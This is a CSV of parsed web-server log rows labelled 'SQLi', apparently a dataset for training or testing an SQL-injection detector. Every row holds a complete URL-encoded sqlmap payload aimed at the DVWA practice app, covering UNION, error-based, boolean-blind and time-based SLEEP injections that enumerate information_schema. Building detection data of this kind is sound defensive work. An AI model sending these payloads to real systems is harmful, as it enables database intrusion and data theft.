ip,identity,user,timestamp,request,status,size,referer,user_agent,vulnerability,method,url,protocol,request_length,url_parts,user_agent_length,Predicted_Vulnerability
12.12.12.12,-,-,2024-06-30 14:40:45-04:00,GET /DVWA/vulnerabilities/sqli/?id=id%27%20UNION%20ALL%20SELECT%20NULL%2CCONCAT%280x71766b7871%2CIFNULL%28CAST%28CHECK_TIME%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28CREATE_OPTIONS%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28CREATE_TIME%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28DATA_FREE%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28DATA_LENGTH%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28INDEX_LENGTH%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28MAX_DATA_LENGTH%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28MAX_INDEX_LENGTH%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28TABLE_CATALOG%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28TABLE_COLLATION%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28TABLE_COMMENT%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28TABLE_ROWS%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28TABLE_SCHEMA%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28TABLE_TYPE%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28UPDATE_TIME%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28%60AUTO_INCREMENT%60%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28%60AVG_ROW_LENGTH%60%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28%60CHECKSUM%60%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28%60ENGINE%60%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28%60ROW_FORMAT%60%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28%60TABLE_NAME%60%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28%60TEMPORARY%60%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28%60VERSION%60%20AS%20CHAR%29%2C0x20%29%2C0x716a707171%29%20FROM%20information_schema.%60TABLES%60%23&Submit=Submit HTTP/1.1,200,5069,-,sqlmap/1.8.6.17#dev (https://sqlmap.org),SQLi,GET,/DVWA/vulnerabilities/sqli/?id=id%27%20UNION%20ALL%20SELECT%20NULL%2CCONCAT%280x71766b7871%2CIFNULL%28CAST%28CHECK_TIME%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28CREATE_OPTIONS%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28CREATE_TIME%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28DATA_FREE%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28DATA_LENGTH%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28INDEX_LENGTH%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28MAX_DATA_LENGTH%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28MAX_INDEX_LENGTH%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28TABLE_CATALOG%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28TABLE_COLLATION%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28TABLE_COMMENT%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28TABLE_ROWS%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28TABLE_SCHEMA%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28TABLE_TYPE%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28UPDATE_TIME%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28%60AUTO_INCREMENT%60%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28%60AVG_ROW_LENGTH%60%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28%60CHECKSUM%60%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28%60ENGINE%60%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28%60ROW_FORMAT%60%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28%60TABLE_NAME%60%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28%60TEMPORARY%60%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28%60VERSION%60%20AS%20CHAR%29%2C0x20%29%2C0x716a707171%29%20FROM%20information_schema.%60TABLES%60%23&Submit=Submit,HTTP/1.1,1873,5,40,SQLi
12.12.12.12,-,-,2024-06-30 14:40:46-04:00,GET /DVWA/vulnerabilities/sqli/?id=id%27%20UNION%20ALL%20SELECT%20NULL%2CCONCAT%280x71766b7871%2CJSON_ARRAYAGG%28CONCAT_WS%280x656e65647272%2Ccolumn_name%2Ccolumn_type%29%29%2C0x716a707171%29%20FROM%20INFORMATION_SCHEMA.COLUMNS%20WHERE%20table_name%3D0x494e4e4f44425f5359535f464f524549474e5f434f4c53%20AND%20table_schema%3D0x696e666f726d6174696f6e5f736368656d61%23&Submit=Submit HTTP/1.1,200,1951,-,sqlmap/1.8.6.17#dev (https://sqlmap.org),SQLi,GET,/DVWA/vulnerabilities/sqli/?id=id%27%20UNION%20ALL%20SELECT%20NULL%2CCONCAT%280x71766b7871%2CJSON_ARRAYAGG%28CONCAT_WS%280x656e65647272%2Ccolumn_name%2Ccolumn_type%29%29%2C0x716a707171%29%20FROM%20INFORMATION_SCHEMA.COLUMNS%20WHERE%20table_name%3D0x494e4e4f44425f5359535f464f524549474e5f434f4c53%20AND%20table_schema%3D0x696e666f726d6174696f6e5f736368656d61%23&Submit=Submit,HTTP/1.1,387,5,40,SQLi
12.12.12.12,-,-,2024-06-30 14:40:46-04:00,GET /DVWA/vulnerabilities/sqli/?id=id%27%20UNION%20ALL%20SELECT%20NULL%2CCONCAT%280x71766b7871%2CJSON_ARRAYAGG%28CONCAT_WS%280x656e65647272%2CFOR_COL_NAME%2CID%2CPOS%2CREF_COL_NAME%29%29%2C0x716a707171%29%20FROM%20information_schema.INNODB_SYS_FOREIGN_COLS%23&Submit=Submit HTTP/1.1,200,609,-,sqlmap/1.8.6.17#dev (https://sqlmap.org),SQLi,GET,/DVWA/vulnerabilities/sqli/?id=id%27%20UNION%20ALL%20SELECT%20NULL%2CCONCAT%280x71766b7871%2CJSON_ARRAYAGG%28CONCAT_WS%280x656e65647272%2CFOR_COL_NAME%2CID%2CPOS%2CREF_COL_NAME%29%29%2C0x716a707171%29%20FROM%20information_schema.INNODB_SYS_FOREIGN_COLS%23&Submit=Submit,HTTP/1.1,282,5,40,SQLi
12.12.12.12,-,-,2024-06-30 14:40:46-04:00,GET /DVWA/vulnerabilities/sqli/?id=id%27%20UNION%20ALL%20SELECT%20NULL%2CCONCAT%280x71766b7871%2CIFNULL%28CAST%28FOR_COL_NAME%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28ID%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28POS%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28REF_COL_NAME%20AS%20CHAR%29%2C0x20%29%2C0x716a707171%29%20FROM%20information_schema.INNODB_SYS_FOREIGN_COLS%23&Submit=Submit HTTP/1.1,200,609,-,sqlmap/1.8.6.17#dev (https://sqlmap.org),SQLi,GET,/DVWA/vulnerabilities/sqli/?id=id%27%20UNION%20ALL%20SELECT%20NULL%2CCONCAT%280x71766b7871%2CIFNULL%28CAST%28FOR_COL_NAME%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28ID%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28POS%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28REF_COL_NAME%20AS%20CHAR%29%2C0x20%29%2C0x716a707171%29%20FROM%20information_schema.INNODB_SYS_FOREIGN_COLS%23&Submit=Submit,HTTP/1.1,446,5,40,SQLi
12.12.12.12,-,-,2024-06-30 14:40:46-04:00,GET /DVWA/vulnerabilities/sqli/?id=id%27%20UNION%20ALL%20SELECT%20NULL%2CCONCAT%280x71766b7871%2CJSON_ARRAYAGG%28CONCAT_WS%280x656e65647272%2CFOR_COL_NAME%2CID%2CPOS%2CREF_COL_NAME%29%29%2C0x716a707171%29%20FROM%20information_schema.INNODB_SYS_FOREIGN_COLS%23&Submit=Submit HTTP/1.1,200,609,-,sqlmap/1.8.6.17#dev (https://sqlmap.org),SQLi,GET,/DVWA/vulnerabilities/sqli/?id=id%27%20UNION%20ALL%20SELECT%20NULL%2CCONCAT%280x71766b7871%2CJSON_ARRAYAGG%28CONCAT_WS%280x656e65647272%2CFOR_COL_NAME%2CID%2CPOS%2CREF_COL_NAME%29%29%2C0x716a707171%29%20FROM%20information_schema.INNODB_SYS_FOREIGN_COLS%23&Submit=Submit,HTTP/1.1,282,5,40,SQLi
12.12.12.12,-,-,2024-06-30 14:40:46-04:00,GET /DVWA/vulnerabilities/sqli/?id=id%27%20UNION%20ALL%20SELECT%20NULL%2CCONCAT%280x71766b7871%2CIFNULL%28CAST%28COUNT%28%2A%29%20AS%20CHAR%29%2C0x20%29%2C0x716a707171%29%20FROM%20information_schema.INNODB_SYS_FOREIGN_COLS%23&Submit=Submit HTTP/1.1,200,609,-,sqlmap/1.8.6.17#dev (https://sqlmap.org),SQLi,GET,/DVWA/vulnerabilities/sqli/?id=id%27%20UNION%20ALL%20SELECT%20NULL%2CCONCAT%280x71766b7871%2CIFNULL%28CAST%28COUNT%28%2A%29%20AS%20CHAR%29%2C0x20%29%2C0x716a707171%29%20FROM%20information_schema.INNODB_SYS_FOREIGN_COLS%23&Submit=Submit,HTTP/1.1,248,5,40,SQLi
12.12.12.12,-,-,2024-06-30 14:40:46-04:00,GET /DVWA/vulnerabilities/sqli/?id=id%27%20OR%20%28SELECT%204506%20FROM%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x71766b7871%2C%28SELECT%20IFNULL%28CAST%28COUNT%28%2A%29%20AS%20CHAR%29%2C0x20%29%20FROM%20information_schema.INNODB_SYS_FOREIGN_COLS%29%2C0x716a707171%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20INFORMATION_SCHEMA.PLUGINS%20GROUP%20BY%20x%29a%29--%20pUSV&Submit=Submit HTTP/1.1,200,609,-,sqlmap/1.8.6.17#dev (https://sqlmap.org),SQLi,GET,/DVWA/vulnerabilities/sqli/?id=id%27%20OR%20%28SELECT%204506%20FROM%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x71766b7871%2C%28SELECT%20IFNULL%28CAST%28COUNT%28%2A%29%20AS%20CHAR%29%2C0x20%29%20FROM%20information_schema.INNODB_SYS_FOREIGN_COLS%29%2C0x716a707171%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20INFORMATION_SCHEMA.PLUGINS%20GROUP%20BY%20x%29a%29--%20pUSV&Submit=Submit,HTTP/1.1,386,5,40,SQLi
12.12.12.12,-,-,2024-06-30 14:40:46-04:00,GET /DVWA/vulnerabilities/sqli/?id=id%27%20OR%20NOT%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28COUNT%28%2A%29%20AS%20CHAR%29%2C0x20%29%20FROM%20information_schema.INNODB_SYS_FOREIGN_COLS%29%2C1%2C1%29%29%3E51%23&Submit=Submit HTTP/1.1,200,609,-,sqlmap/1.8.6.17#dev (https://sqlmap.org),SQLi,GET,/DVWA/vulnerabilities/sqli/?id=id%27%20OR%20NOT%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28COUNT%28%2A%29%20AS%20CHAR%29%2C0x20%29%20FROM%20information_schema.INNODB_SYS_FOREIGN_COLS%29%2C1%2C1%29%29%3E51%23&Submit=Submit,HTTP/1.1,233,5,40,SQLi
12.12.12.12,-,-,2024-06-30 14:40:46-04:00,GET /DVWA/vulnerabilities/sqli/?id=id%27%20OR%20NOT%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28COUNT%28%2A%29%20AS%20CHAR%29%2C0x20%29%20FROM%20information_schema.INNODB_SYS_FOREIGN_COLS%29%2C1%2C1%29%29%3E54%23&Submit=Submit HTTP/1.1,200,609,-,sqlmap/1.8.6.17#dev (https://sqlmap.org),SQLi,GET,/DVWA/vulnerabilities/sqli/?id=id%27%20OR%20NOT%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28COUNT%28%2A%29%20AS%20CHAR%29%2C0x20%29%20FROM%20information_schema.INNODB_SYS_FOREIGN_COLS%29%2C1%2C1%29%29%3E54%23&Submit=Submit,HTTP/1.1,233,5,40,SQLi
12.12.12.12,-,-,2024-06-30 14:40:46-04:00,GET /DVWA/vulnerabilities/sqli/?id=id%27%20OR%20NOT%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28COUNT%28%2A%29%20AS%20CHAR%29%2C0x20%29%20FROM%20information_schema.INNODB_SYS_FOREIGN_COLS%29%2C1%2C1%29%29%3E56%23&Submit=Submit HTTP/1.1,200,609,-,sqlmap/1.8.6.17#dev (https://sqlmap.org),SQLi,GET,/DVWA/vulnerabilities/sqli/?id=id%27%20OR%20NOT%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28COUNT%28%2A%29%20AS%20CHAR%29%2C0x20%29%20FROM%20information_schema.INNODB_SYS_FOREIGN_COLS%29%2C1%2C1%29%29%3E56%23&Submit=Submit,HTTP/1.1,233,5,40,SQLi
12.12.12.12,-,-,2024-06-30 14:40:46-04:00,GET /DVWA/vulnerabilities/sqli/?id=id%27%20OR%20NOT%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28COUNT%28%2A%29%20AS%20CHAR%29%2C0x20%29%20FROM%20information_schema.INNODB_SYS_FOREIGN_COLS%29%2C1%2C1%29%29%3E57%23&Submit=Submit HTTP/1.1,200,609,-,sqlmap/1.8.6.17#dev (https://sqlmap.org),SQLi,GET,/DVWA/vulnerabilities/sqli/?id=id%27%20OR%20NOT%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28COUNT%28%2A%29%20AS%20CHAR%29%2C0x20%29%20FROM%20information_schema.INNODB_SYS_FOREIGN_COLS%29%2C1%2C1%29%29%3E57%23&Submit=Submit,HTTP/1.1,233,5,40,SQLi
12.12.12.12,-,-,2024-06-30 14:40:46-04:00,GET /DVWA/vulnerabilities/sqli/?id=id%27%20AND%20%28SELECT%207534%20FROM%20%28SELECT%28SLEEP%285-%28IF%28ORD%28MID%28%28SELECT%20IFNULL%28CAST%28COUNT%28%2A%29%20AS%20CHAR%29%2C0x20%29%20FROM%20information_schema.INNODB_SYS_FOREIGN_COLS%29%2C1%2C1%29%29%3E51%2C0%2C5%29%29%29%29%29wQtB%29--%20OdCi&Submit=Submit HTTP/1.1,200,609,-,sqlmap/1.8.6.17#dev (https://sqlmap.org),SQLi,GET,/DVWA/vulnerabilities/sqli/?id=id%27%20AND%20%28SELECT%207534%20FROM%20%28SELECT%28SLEEP%285-%28IF%28ORD%28MID%28%28SELECT%20IFNULL%28CAST%28COUNT%28%2A%29%20AS%20CHAR%29%2C0x20%29%20FROM%20information_schema.INNODB_SYS_FOREIGN_COLS%29%2C1%2C1%29%29%3E51%2C0%2C5%29%29%29%29%29wQtB%29--%20OdCi&Submit=Submit,HTTP/1.1,320,5,40,SQLi
12.12.12.12,-,-,2024-06-30 14:40:46-04:00,GET /DVWA/vulnerabilities/sqli/?id=id%27%20AND%20%28SELECT%207534%20FROM%20%28SELECT%28SLEEP%285-%28IF%28ORD%28MID%28%28SELECT%20IFNULL%28CAST%28COUNT%28%2A%29%20AS%20CHAR%29%2C0x20%29%20FROM%20information_schema.INNODB_SYS_FOREIGN_COLS%29%2C1%2C1%29%29%3E48%2C0%2C5%29%29%29%29%29wQtB%29--%20OdCi&Submit=Submit HTTP/1.1,200,609,-,sqlmap/1.8.6.17#dev (https://sqlmap.org),SQLi,GET,/DVWA/vulnerabilities/sqli/?id=id%27%20AND%20%28SELECT%207534%20FROM%20%28SELECT%28SLEEP%285-%28IF%28ORD%28MID%28%28SELECT%20IFNULL%28CAST%28COUNT%28%2A%29%20AS%20CHAR%29%2C0x20%29%20FROM%20information_schema.INNODB_SYS_FOREIGN_COLS%29%2C1%2C1%29%29%3E48%2C0%2C5%29%29%29%29%29wQtB%29--%20OdCi&Submit=Submit,HTTP/1.1,320,5,40,SQLi
12.12.12.12,-,-,2024-06-30 14:40:46-04:00,GET /DVWA/vulnerabilities/sqli/?id=id%27%20AND%20%28SELECT%207534%20FROM%20%28SELECT%28SLEEP%285-%28IF%28ORD%28MID%28%28SELECT%20IFNULL%28CAST%28COUNT%28%2A%29%20AS%20CHAR%29%2C0x20%29%20FROM%20information_schema.INNODB_SYS_FOREIGN_COLS%29%2C1%2C1%29%29%3E9%2C0%2C5%29%29%29%29%29wQtB%29--%20OdCi&Submit=Submit HTTP/1.1,200,609,-,sqlmap/1.8.6.17#dev (https://sqlmap.org),SQLi,GET,/DVWA/vulnerabilities/sqli/?id=id%27%20AND%20%28SELECT%207534%20FROM%20%28SELECT%28SLEEP%285-%28IF%28ORD%28MID%28%28SELECT%20IFNULL%28CAST%28COUNT%28%2A%29%20AS%20CHAR%29%2C0x20%29%20FROM%20information_schema.INNODB_SYS_FOREIGN_COLS%29%2C1%2C1%29%29%3E9%2C0%2C5%29%29%29%29%29wQtB%29--%20OdCi&Submit=Submit,HTTP/1.1,319,5,40,SQLi
12.12.12.12,-,-,2024-06-30 14:40:46-04:00,GET /DVWA/vulnerabilities/sqli/?id=id%27%20UNION%20ALL%20SELECT%20NULL%2CCONCAT%280x71766b7871%2CJSON_ARRAYAGG%28CONCAT_WS%280x656e65647272%2Ccolumn_name%2Ccolumn_type%29%29%2C0x716a707171%29%20FROM%20INFORMATION_SCHEMA.COLUMNS%20WHERE%20table_name%3D0x494e4e4f44425f4255464645525f50414745%20AND%20table_schema%3D0x696e666f726d6174696f6e5f736368656d61%23&Submit=Submit HTTP/1.1,200,2163,-,sqlmap/1.8.6.17#dev (https://sqlmap.org),SQLi,GET,/DVWA/vulnerabilities/sqli/?id=id%27%20UNION%20ALL%20SELECT%20NULL%2CCONCAT%280x71766b7871%2CJSON_ARRAYAGG%28CONCAT_WS%280x656e65647272%2Ccolumn_name%2Ccolumn_type%29%29%2C0x716a707171%29%20FROM%20INFORMATION_SCHEMA.COLUMNS%20WHERE%20table_name%3D0x494e4e4f44425f4255464645525f50414745%20AND%20table_schema%3D0x696e666f726d6174696f6e5f736368656d61%23&Submit=Submit,HTTP/1.1,377,5,40,SQLi
12.12.12.12,-,-,2024-06-30 14:40:46-04:00,GET /DVWA/vulnerabilities/sqli/?id=id%27%20UNION%20ALL%20SELECT%20NULL%2CCONCAT%280x71766b7871%2CJSON_ARRAYAGG%28CONCAT_WS%280x656e65647272%2CACCESS_TIME%2CBLOCK_ID%2CCOMPRESSED_SIZE%2CDATA_SIZE%2CFIX_COUNT%2CFLUSH_TYPE%2CFREE_PAGE_CLOCK%2CINDEX_NAME%2CIO_FIX%2CIS_HASHED%2CIS_OLD%2CNEWEST_MODIFICATION%2CNUMBER_RECORDS%2COLDEST_MODIFICATION%2CPAGE_NUMBER%2CPAGE_STATE%2CPAGE_TYPE%2CPOOL_ID%2C%60SPACE%60%2C%60TABLE_NAME%60%29%29%2C0x716a707171%29%20FROM%20information_schema.INNODB_BUFFER_PAGE%23&Submit=Submit HTTP/1.1,200,609,-,sqlmap/1.8.6.17#dev (https://sqlmap.org),SQLi,GET,/DVWA/vulnerabilities/sqli/?id=id%27%20UNION%20ALL%20SELECT%20NULL%2CCONCAT%280x71766b7871%2CJSON_ARRAYAGG%28CONCAT_WS%280x656e65647272%2CACCESS_TIME%2CBLOCK_ID%2CCOMPRESSED_SIZE%2CDATA_SIZE%2CFIX_COUNT%2CFLUSH_TYPE%2CFREE_PAGE_CLOCK%2CINDEX_NAME%2CIO_FIX%2CIS_HASHED%2CIS_OLD%2CNEWEST_MODIFICATION%2CNUMBER_RECORDS%2COLDEST_MODIFICATION%2CPAGE_NUMBER%2CPAGE_STATE%2CPAGE_TYPE%2CPOOL_ID%2C%60SPACE%60%2C%60TABLE_NAME%60%29%29%2C0x716a707171%29%20FROM%20information_schema.INNODB_BUFFER_PAGE%23&Submit=Submit,HTTP/1.1,520,5,40,SQLi
12.12.12.12,-,-,2024-06-30 14:40:46-04:00,GET /DVWA/vulnerabilities/sqli/?id=id%27%20UNION%20ALL%20SELECT%20NULL%2CCONCAT%280x71766b7871%2CIFNULL%28CAST%28ACCESS_TIME%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28BLOCK_ID%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28COMPRESSED_SIZE%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28DATA_SIZE%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28FIX_COUNT%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28FLUSH_TYPE%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28FREE_PAGE_CLOCK%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28INDEX_NAME%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28IO_FIX%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28IS_HASHED%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28IS_OLD%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28NEWEST_MODIFICATION%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28NUMBER_RECORDS%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28OLDEST_MODIFICATION%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28PAGE_NUMBER%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28PAGE_STATE%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28PAGE_TYPE%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28POOL_ID%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28%60SPACE%60%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28%60TABLE_NAME%60%20AS%20CHAR%29%2C0x20%29%2C0x716a707171%29%20FROM%20information_schema.INNODB_BUFFER_PAGE%23&Submit=Submit HTTP/1.1,200,609,-,sqlmap/1.8.6.17#dev (https://sqlmap.org),SQLi,GET,/DVWA/vulnerabilities/sqli/?id=id%27%20UNION%20ALL%20SELECT%20NULL%2CCONCAT%280x71766b7871%2CIFNULL%28CAST%28ACCESS_TIME%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28BLOCK_ID%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28COMPRESSED_SIZE%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28DATA_SIZE%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28FIX_COUNT%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28FLUSH_TYPE%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28FREE_PAGE_CLOCK%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28INDEX_NAME%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28IO_FIX%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28IS_HASHED%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28IS_OLD%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28NEWEST_MODIFICATION%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28NUMBER_RECORDS%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28OLDEST_MODIFICATION%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28PAGE_NUMBER%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28PAGE_STATE%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28PAGE_TYPE%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28POOL_ID%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28%60SPACE%60%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28%60TABLE_NAME%60%20AS%20CHAR%29%2C0x20%29%2C0x716a707171%29%20FROM%20information_schema.INNODB_BUFFER_PAGE%23&Submit=Submit,HTTP/1.1,1612,5,40,SQLi
